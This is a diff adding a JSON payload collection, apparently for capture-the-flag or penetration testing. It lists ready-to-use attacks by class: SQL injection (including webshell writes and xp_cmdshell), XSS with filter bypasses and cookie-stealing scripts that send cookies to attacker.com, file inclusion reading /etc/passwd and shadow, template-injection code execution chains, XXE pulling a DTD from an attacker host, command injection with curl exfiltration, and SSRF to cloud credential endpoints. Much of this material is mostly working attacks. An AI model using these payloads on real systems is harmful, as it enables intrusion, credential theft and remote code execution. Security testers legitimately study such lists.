@@ -1,0 +1,315 @@
+{
+  "sqli": {
+    "generic": [
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "' UNION SELECT NULL--",
+      "' UNION SELECT NULL,NULL--",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "admin'--",
+      "' OR 'x'='x",
+      "1' ORDER BY 1--",
+      "1' ORDER BY 2--",
+      "1' ORDER BY 3--"
+    ],
+    "mysql": [
+      "' AND SLEEP(5)-- -",
+      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
+      "' UNION SELECT NULL,@@version,NULL-- -",
+      "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -",
+      "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -",
+      "' UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users-- -",
+      "' AND (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL-- -",
+      "' INTO OUTFILE '/var/www/html/shell.php'-- -"
+    ],
+    "postgresql": [
+      "'; SELECT pg_sleep(5)-- -",
+      "' UNION SELECT NULL,version(),NULL-- -",
+      "' UNION SELECT NULL,current_database(),NULL-- -",
+      "'; COPY (SELECT '') TO PROGRAM 'id'-- -",
+      "' AND 1=CAST((SELECT version()) AS INT)-- -"
+    ],
+    "sqlite": [
+      "' UNION SELECT NULL,sqlite_version(),NULL-- -",
+      "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -",
+      "' AND (SELECT UNICODE(SUBSTR(sqlite_version(),1,1)))>50-- -"
+    ],
+    "mssql": [
+      "'; WAITFOR DELAY '0:0:5'-- -",
+      "'; EXEC xp_cmdshell('whoami')-- -",
+      "' UNION SELECT NULL,@@version,NULL-- -"
+    ],
+    "waf_bypass": [
+      "/*!50000' AND SLEEP(5)-- -*/",
+      "' /*!UNION*/ /*!SELECT*/ NULL,version(),NULL-- -",
+      "' UNION%20SELECT%20NULL,version(),NULL-- -",
+      "'/**/OR/**/1=1-- -"
+    ]
+  },
+  "xss": {
+    "generic": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "\"><script>alert(document.domain)</script>",
+      "javascript:alert(1)",
+      "<details open ontoggle=alert(1)>",
+      "<body onload=alert(1)>"
+    ],
+    "attribute_context": [
+      "\" onmouseover=\"alert(1)",
+      "' onmouseover='alert(1)",
+      "\"><img src=x onerror=alert(1)>",
+      "\" autofocus onfocus=\"alert(1)"
+    ],
+    "dom_based": [
+      "#<img src=x onerror=alert(1)>",
+      "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
+      "<iframe src=\"javascript:alert(1)\"></iframe>"
+    ],
+    "waf_bypass": [
+      "<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>",
+      "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
+    ],
+    "cookie_steal": [
+      "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+      "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">",
+      "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"
+    ]
+  },
+  "lfi": {
+    "generic": [
+      "../../../../etc/passwd",
+      "../../../../etc/shadow",
+      "../../../../proc/self/environ",
+      "../../../../var/log/apache2/access.log",
+      "../../../../var/log/nginx/access.log",
+      "php://filter/convert.base64-encode/resource=index.php",
+      "php://filter/read=convert.base64-encode/resource=config.php",
+      "php://input",
+      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+      "expect://id"
+    ],
+    "windows": [
+      "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..\\..\\..\\..\\windows\\win.ini",
+      "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    ],
+    "log_poisoning": [
+      "../../../../var/log/apache2/access.log",
+      "../../../../var/log/apache/access.log",
+      "../../../../var/log/nginx/access.log",
+      "../../../../proc/self/fd/0",
+      "../../../../proc/self/fd/1",
+      "../../../../proc/self/fd/2"
+    ],
+    "waf_bypass": [
+      "....//....//....//etc/passwd",
+      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "..%252F..%252F..%252Fetc%252Fpasswd"
+    ]
+  },
+  "ssti": {
+    "detection": [
+      "{{7*7}}",
+      "${7*7}",
+      "#{7*7}",
+      "<%= 7*7 %>",
+      "{{7*'7'}}",
+      "${{'a':'b'}}",
+      "{{config}}",
+      "{{self}}"
+    ],
+    "jinja2": [
+      "{{config.items()}}",
+      "{{''.__class__.__mro__[1].__subclasses__()}}",
+      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"
+    ],
+    "twig": [
+      "{{7*7}}",
+      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+      "{{['id']|filter('system')}}"
+    ],
+    "freemarker": [
+      "${7*7}",
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+      "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    ],
+    "velocity": [
+      "#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')"
+    ],
+    "mako": [
+      "${7*7}",
+      "${__import__('os').popen('id').read()}"
+    ]
+  },
+  "xxe": {
+    "generic": [
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>"
+    ],
+    "blind": [
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo>test</foo>",
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><foo>test</foo>"
+    ],
+    "oob": [
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/\"> %xxe;]><foo>test</foo>"
+    ]
+  },
+  "cmdi": {
+    "generic": [
+      "; id",
+      "| id",
+      "|| id",
+      "& id",
+      "&& id",
+      "`id`",
+      "$(id)",
+      "; cat /etc/passwd",
+      "| cat /etc/passwd",
+      "; ls -la",
+      "; whoami",
+      "; uname -a"
+    ],
+    "blind": [
+      "; sleep 5",
+      "| sleep 5",
+      "& sleep 5",
+      "; ping -c 5 127.0.0.1",
+      "; curl http://attacker.com/$(id)"
+    ],
+    "waf_bypass": [
+      ";i''d",
+      ";i$@d",
+      ";\\id",
+      ";/usr/bin/id",
+      ";c''at /etc/passwd",
+      ";ca$@t /etc/passwd",
+      ";{cat,/etc/passwd}"
+    ],
+    "windows": [
+      "& whoami",
+      "| whoami",
+      "&& whoami",
+      "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "; dir C:\\"
+    ]
+  },
+  "ssrf": {
+    "generic": [
+      "http://127.0.0.1/",
+      "http://localhost/",
+      "http://0.0.0.0/",
+      "http://[::1]/",
+      "http://169.254.169.254/",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://metadata.google.internal/",
+      "http://100.100.100.200/latest/meta-data/"
+    ],
+    "bypass": [
+      "http://127.0.0.1:80/",
+      "http://0177.0.0.1/",
+      "http://0x7f000001/",
+      "http://2130706433/",
+      "http://127.1/",
+      "http://127.0.1/",
+      "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+      "http://①②⑦.⓪.⓪.①/"
+    ],
+    "cloud_metadata": [
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "http://169.254.169.254/latest/user-data/",
+      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+    ],
+    "internal_services": [
+      "http://127.0.0.1:6379/",
+      "http://127.0.0.1:27017/",
+      "http://127.0.0.1:9200/",
+      "http://127.0.0.1:8080/",
+      "http://127.0.0.1:8500/"
+    ]
+  },
+  "crypto": {
+    "rsa": [
+      "from Crypto.Util.number import long_to_bytes, inverse; m = pow(c, d, n); print(long_to_bytes(m))",
+      "import gmpy2; m = gmpy2.iroot(c, e)[0]; print(long_to_bytes(int(m)))",
+      "from sympy import factorint; factors = factorint(n); p, q = list(factors.keys())",
+      "d = inverse(e, (p-1)*(q-1)); m = pow(c, d, n)",
+      "# Wiener attack: from owiener import attack; d = attack(e, n)",
+      "# Fermat factorization: a = isqrt(n)+1; b2 = a*a - n; b = isqrt(b2)"
+    ],
+    "xor": [
+      "from pwn import xor; result = xor(ciphertext, key)",
+      "result = bytes([c ^ k for c, k in zip(ciphertext, itertools.cycle(key))])",
+      "# Single byte XOR brute: [bytes([b ^ k for b in ct]) for k in range(256)]",
+      "# Known plaintext: key = xor(ciphertext[:len(known)], known)",
+      "from Crypto.Util.strxor import strxor; plain = strxor(ct, key)"
+    ],
+    "classical": [
+      "# Caesar brute: [''.join(chr((ord(c)-65+i)%26+65) for c in ct) for i in range(26)]",
+      "# Vigenere: key_len via Kasiski; then frequency analysis per position",
+      "# Rail fence: read diagonally with n rails",
+      "# Substitution: frequency analysis + quipqiup.com",
+      "# Atbash: ''.join(chr(155 - ord(c)) if c.isalpha() else c for c in ct)"
+    ],
+    "hash": [
+      "import hashlib; hashlib.md5(b'candidate').hexdigest()",
+      "# hashcat -m 0 hash.txt wordlist.txt",
+      "# john --format=raw-md5 hash.txt",
+      "# Online: crackstation.net, hashes.org",
+      "# Rainbow table: rtgen md5 loweralpha 1 7 0 3800 33554432 0"
+    ],
+    "aes": [
+      "from Crypto.Cipher import AES; cipher = AES.new(key, AES.MODE_ECB); plain = cipher.decrypt(ct)",
+      "# CBC bit-flipping: ct[i] ^= old_byte ^ new_byte",
+      "# Padding oracle: modify ct block and observe padding errors",
+      "from Crypto.Cipher import AES; cipher = AES.new(key, AES.MODE_CBC, iv); plain = cipher.decrypt(ct)",
+      "# ECB detection: check for repeated 16-byte blocks in ciphertext"
+    ]
+  },
+  "misc": {
+    "steganography": [
+      "steghide extract -sf image.jpg -p ''",
+      "zsteg image.png -a",
+      "exiftool image.jpg | grep -i flag",
+      "strings image.png | grep -i flag",
+      "binwalk -e image.png",
+      "stegsolve # visual analysis of bit planes"
+    ],
+    "forensics": [
+      "file unknown_file",
+      "binwalk -e suspicious_file",
+      "foremost -i disk.img -o output/",
+      "volatility -f memory.dmp imageinfo",
+      "strings -n 8 binary_file | grep -i flag"
+    ],
+    "network": [
+      "tshark -r capture.pcap -Y 'http' -T fields -e http.file_data",
+      "tshark -r capture.pcap -Y 'ftp-data' -T fields -e data",
+      "tcpflow -r capture.pcap",
+      "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name",
+      "scapy: rdpcap('capture.pcap'); [pkt.summary() for pkt in pkts]"
+    ],
+    "archive": [
+      "zip2john protected.zip > hash.txt && john hash.txt",
+      "7z x archive.7z -p'password'",
+      "# Pseudo-encryption: fix local file header flags (byte 6-7)",
+      "fcrackzip -D -p wordlist.txt -u protected.zip",
+      "python -c \"import zipfile; z=zipfile.ZipFile('f.zip'); z.extractall(pwd=b'pass')\""
+    ],
+    "encoding": [
+      "echo 'encoded' | base64 -d",
+      "echo '68656c6c6f' | xxd -r -p",
+      "python -c \"import base64; print(base64.b32decode('ENCODED').decode())\"",
+      "# Morse: .- = A, -... = B, etc.",
+      "python -c \"print(bytes.fromhex('hex_string').decode())\""
+    ]
+  }
+}
